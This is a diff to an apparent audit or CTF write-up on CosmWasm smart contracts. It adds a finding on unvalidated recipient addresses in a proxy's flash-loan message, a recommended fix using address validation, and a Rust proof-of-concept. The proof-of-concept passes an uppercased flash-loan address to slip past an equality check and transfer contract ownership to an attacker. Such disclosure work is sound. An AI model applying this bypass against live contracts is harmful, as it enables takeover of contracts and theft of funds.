@@ -86,19 +86,56 @@ assert_eq!(voting_power, std::u128::MAX);
 
 ### Description
 
-The bug occurs in `request_flash_loan` because
-the message can the proxy itself to transfer
-ownership of the contract.
+Bug occurs in message architecture. Should
+always be Strings when passed by user. Validation must happen inside the contract.
+
+```rust
+// packages/common/src/proxy.rs
+#[cw_serde]
+pub enum ExecuteMsg {
+    // Bao: These addresses are untrusted...
+    RequestFlashLoan { recipient: Addr, msg: Binary },
+}
+```
 
 ### Recommendation
 
-The fix should prevent the proxy contract's recipient to
-be itself.
+Fix recipient type to String and validate
+into address type inside proxy contract.
+
+```rust
+// packages/common/src/proxy.rs
+#[cw_serde]
+pub enum ExecuteMsg {
+    RequestFlashLoan { recipient: String, msg: Binary },
+}
+
+// contracts/proxy/src/contract.rs
+let recipient_addr = deps.api.addr_validate(&recipient)?;
+```
 
 ### Proof of concept
 
+See `exploit_bad_addr_input()` in proxy integration tests. 
+
 ```rust
-// code goes here
+// EXPLOIT: user can pass in uppercased flash loan address
+// This will fail the `recipient == flash_loan_addr` check
+// but will allow the proxy to call the flash loan contract directly
+let flash_recipient = Addr::unchecked(flash_loan_contract.to_string().to_ascii_uppercase());
+app.execute_contract(
+    Addr::unchecked(ADMIN),
+    proxy_contract.clone(),
+    &ExecuteMsg::RequestFlashLoan {
+        recipient: flash_recipient,
+        msg: to_binary(&FlashLoanExecuteMsg::TransferOwner {
+            new_owner: Addr::unchecked(HACKER),
+        })
+        .unwrap(),
+    },
+    &[],
+)
+.unwrap();
 ```
 
 ---
@@ -232,7 +269,7 @@ match from_binary(&cw20_msg.msg) {
 
         let sender_addr = deps.api.addr_validate(&cw20_msg.sender)?;
         VOTES_CASTED.save(
-            deps.storage, 
+            deps.storage,
             sender_addr,
             cw20_msg.amount.clone()
         )?;
